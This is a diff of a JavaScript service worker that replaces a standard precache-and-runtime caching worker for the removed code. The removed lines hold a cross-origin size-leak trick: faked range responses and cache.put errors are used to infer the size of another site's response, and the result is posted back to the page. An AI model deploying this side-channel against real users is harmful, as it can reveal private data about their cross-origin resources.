@@ -1,43 +1,55 @@
-'use strict';
+const PRECACHE = 'precache-v1';
+const RUNTIME = 'runtime';
 
-self.addEventListener("install", () => {
-    self.skipWaiting();
+// A list of local resources we always want to be cached.
+const PRECACHE_URLS = [
+  'jquery.min.js'
+];
+
+// The install handler takes care of precaching the resources we always need.
+self.addEventListener('install', event => {
+  event.waitUntil(
+    caches.open(PRECACHE)
+      .then(cache => cache.addAll(PRECACHE_URLS))
+      .then(self.skipWaiting())
+  );
 });
 
-self.addEventListener("fetch", async (e) => {
-	let url = new URL(e.request.url);
-	let urlParams = new URLSearchParams(url.search);
-	let size = urlParams.get("size");
-	let body = "A".repeat(Number(size));
+// The activate handler takes care of cleaning up old caches.
+self.addEventListener('activate', event => {
+  const currentCaches = [PRECACHE, RUNTIME];
+  event.waitUntil(
+    caches.keys().then(cacheNames => {
+      return cacheNames.filter(cacheName => !currentCaches.includes(cacheName));
+    }).then(cachesToDelete => {
+      return Promise.all(cachesToDelete.map(cacheToDelete => {
+        return caches.delete(cacheToDelete);
+      }));
+    }).then(() => self.clients.claim())
+  );
+});
 
-	if (e.request.headers.get("range") === "bytes=0-") {
+// The fetch handler serves responses for same-origin resources from a cache.
+// If no response is found, it populates the runtime cache with the response
+// from the network before returning it to the page.
+self.addEventListener('fetch', event => {
+  // Skip cross-origin requests, like those for Google Analytics.
+  if (event.request.url.startsWith(self.location.origin)) {
+    event.respondWith(
+      caches.match(event.request).then(cachedResponse => {
+        if (cachedResponse) {
+          return cachedResponse;
+        }
 
-		e.respondWith(new Response(body, {status: 206, headers: {
-			"Content-Type": "audio/mp4",
-			"Content-Range": "bytes 0-1/13337"
-		}}));
-
-	} else if (e.request.headers.get("range") === `bytes=${Number(size)}-`) {
-
-		let response = await fetch(e.request);
-	    let cache    = await caches.open("leak");
-
-	    let rangeError = false;
-
-	    try {
-	    	await cache.put(`/leak?${Math.random()}`, response);
-	    	rangeError = true;
-	    } catch (err) {
-	    	rangeError = false;
-	    }
-
-	    let clients = await self.clients.matchAll({
-	    	includeUncontrolled: true,
-	    	type: "window",
-	    });
-
-	    clients[0].postMessage({ rangeError, url: url.toString().split("?")[0], size: Number(size) });
-
-	}
-
+        return caches.open(RUNTIME).then(cache => {
+          return fetch(event.request).then(response => {
+            // Put a copy of the response in the runtime cache.
+            return cache.put(event.request, response.clone()).then(() => {
+              return response;
+            });
+          });
+        });
+      })
+    );
+  }
 });
